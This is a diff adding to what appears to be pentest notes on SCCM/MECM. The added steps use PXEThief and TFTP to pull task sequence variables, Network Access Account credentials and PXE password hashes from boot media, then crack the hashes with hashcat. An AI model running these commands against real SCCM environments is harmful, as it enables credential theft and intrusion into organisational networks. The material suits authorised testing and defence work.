@@ -73,6 +73,39 @@ After saving changes and rebooting the Windows VM. It should auto login as the n
 
         SharpSCCM.exe local secrets -m disk
 
+## PXEThief
+
+PXETHIEF is best utilised from a Windows based system so it can decrypt password values. PXETHIEF helps automate the process of collecting ConfigMgr Collection Variables, Task Sequence variables and NAA account credentials from PXE images.
+
+##### Directly target MECM Server
+
+        py.exe pxethief.py 2 <MECM Server IP>
+
+##### Broadcast 
+
+        py.exe pxethief.py 1
+
+
+## Encrypted Boot Mediums
+
+SCCM can be configured to set passwords on PXE. When this is the case, a valid password needs to be provided before the boot media is accessible. PXETHIEF can be used to obtain the hashed password value, if the password is weak, we can crack it and proceed with the same steps in the above sections of this document to perform credential extraction.
+
+1) Download the boot var with TFTP
+
+        tftp -i 192.168.60.11 GET "\SMSTemp\2024.04.13.14.11.18.0001.{51724F94-5668-41AD-A8B1-703658B6906C}.boot.var" "2024.04.13.14.11.18.0001.{51724F94-5668-41AD-A8B1-703658B6906C}.boot.var"
+
+2) Use with option 5 in PXETHIEF to receive the PXE password hash
+
+        py.exe .\pxethief.py 5 '.\2024.04.13.14.11.18.0001.{51724F94-5668-41AD-A8B1-703658B6906C}.boot.var'
+
+3) Crach the hash (Required hash module: https://github.com/The-Viper-One/hashcat-6.2.6-SCCM or https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module)
+
+        hashcat-6.2.6-SCCM.exe -m 19850 -a 0 $sccm$aes128$0000edec1400000010330000203300000e6600000000000008b5ea1dab29bdd0de62e6506b108b5c <password-file.txt> <rules>
+
+
+Now that the PXE password has been obtained, the same steps in Unencrypted Boot Medium section can be followed for credential extraction.
+
+
 #### 1) Request IP and PXE boot preconfigure details from DHCP ( MDT IP)
 
 #### 2) Use TFTP to request each BCD file and enumerate the configuration for all of them.
